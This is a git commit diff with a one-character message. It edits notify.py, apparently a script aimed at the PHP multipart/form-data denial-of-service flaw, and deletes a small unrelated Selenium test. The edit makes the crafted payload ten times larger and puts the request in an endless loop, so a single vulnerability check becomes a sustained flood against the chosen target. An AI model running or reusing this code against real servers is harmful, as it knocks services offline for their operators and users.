68725f3c19e50607055a30b23ffca677d7670cac
judasnow <judasnow@gmail.com>
2015-05-21 08:58:11 +0800

    .

--- notify.py
+++ notify.py
@@ -50,7 +50,7 @@ def main():
     else:
         return
  
-    Num=350000
+    Num=3500000
     headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
             'Accept-Encoding':'gzip, deflate',
             'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
@@ -61,7 +61,8 @@ def main():
     body = body + payload;
     body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
     print "starting...";
-    respond=check_php_multipartform_dos(target,body,headers)
+    while True:
+        respond=check_php_multipartform_dos(target,body,headers)
     print "Result : "
     print respond[0]
     print "Respond time : "+str(respond[1]) + " seconds";
--- tdd_with_python/functional_tests.py
+++
@@ -1,8 +0,0 @@
-# coding=utf-8
-
-from selenium import webdriver
-
-browser = webdriver.Firefox()
-browser.get("http://lo:19000")
-
-assert "Django" in browser.title
